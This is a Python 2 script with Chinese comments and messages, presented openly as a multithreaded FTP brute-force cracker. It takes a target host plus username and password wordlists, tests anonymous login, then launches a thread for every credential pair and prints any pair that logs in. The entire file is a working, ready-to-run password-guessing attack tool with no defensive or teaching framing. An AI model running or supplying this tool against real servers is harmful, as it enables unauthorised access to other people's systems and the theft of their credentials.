#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/9/5
# Created by 独自等待
# 博客 http://www.waitalone.cn/
from threading import Thread
import ftplib, socket
import sys, time, re


def usage():
    print '+' + '-' * 50 + '+'
    print '\t    Python FTP暴力破解工具多线程版'
    print '\t   Blog：http://www.waitalone.cn/'
    print '\t\t Code BY： 独自等待'
    print '\t\t Time：2014-09-05'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print "用法: ftpbrute_mult.py 待破解的ip/domain 用户名列表 字典列表"
        print "实例: ftpbrute_mult.py www.waitalone.cn user.txt pass.txt"
        sys.exit()


def brute_anony():
    try:
        print '[+] 测试匿名登陆……\n'
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        print 'FTP消息: %s \n' % ftp.getwelcome()
        ftp.login()
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] 匿名登陆成功……\n'
    except ftplib.all_errors:
        print '\n[-] 匿名登陆失败……\n'


def brute_users(user, pwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        ftp.login(user, pwd)
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, pwd)
    except ftplib.all_errors:
        pass


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[2])]
    passlist = [j.rstrip() for j in open(sys.argv[3])]
    print '目  标：%s \n' % sys.argv[1]
    print '用户名：%d 条\n' % len(userlist)
    print '密  码：%d 条\n' % len(passlist)
    brute_anony()
    print '\n[+] 暴力破解测试中……\n'
    thrdlist = []
    for user in userlist:
        for pwd in passlist:
            t = Thread(target=brute_users, args=(user, pwd))
            t.start()
            thrdlist.append(t)
            time.sleep(0.009)
    for x in thrdlist:
        x.join()
    print '[+] 破解完成，用时： %d 秒' % (time.time() - start_time)
